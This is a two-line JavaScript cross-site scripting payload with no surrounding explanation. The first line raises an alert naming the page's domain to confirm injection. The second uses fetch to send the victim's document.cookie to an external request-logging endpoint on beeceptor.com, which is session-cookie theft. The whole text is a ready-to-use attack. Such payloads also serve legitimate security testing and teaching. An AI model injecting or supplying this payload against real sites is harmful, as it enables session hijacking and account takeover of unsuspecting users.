alert("XSS on "+ document.domain)

fetch(`https://ywhftw.free.beeceptor.com/log?cookie=${document.cookie}`)
